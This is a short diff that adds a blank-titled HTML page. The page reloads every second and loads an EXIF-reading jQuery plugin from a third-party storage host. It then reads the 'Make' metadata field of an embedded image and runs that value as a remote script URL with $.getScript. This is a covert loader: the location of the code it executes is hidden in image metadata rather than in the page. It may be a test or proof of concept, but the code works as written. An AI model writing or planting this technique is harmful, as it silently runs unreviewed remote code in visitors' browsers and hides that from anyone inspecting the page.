@@ -1,0 +1,23 @@
+
+<html><head>
+<META HTTP-EQUIV="Pragma" CONTENT="no-cache"> 
+<META HTTP-EQUIV="Cache-Control" CONTENT="no-cache"> 
+<META HTTP-EQUIV="Expires" CONTENT="0"> 
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<title></title>
+
+<meta http-equiv="refresh" content="1">
+<img src="test1.jpg" id="img" exif="true"/></img>
+<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+<script src="//testeeee.bj.bcebos.com/jquery.exif.js"></script>
+<script>   
+$(window).load(function() {
+	var $this = $("#img").exifLoad(function() {
+		var mm2 = $this.exif("Make"); 
+ 	  $.getScript(mm2);
+	})
+});
+</script>
+</body>
+</html>
+
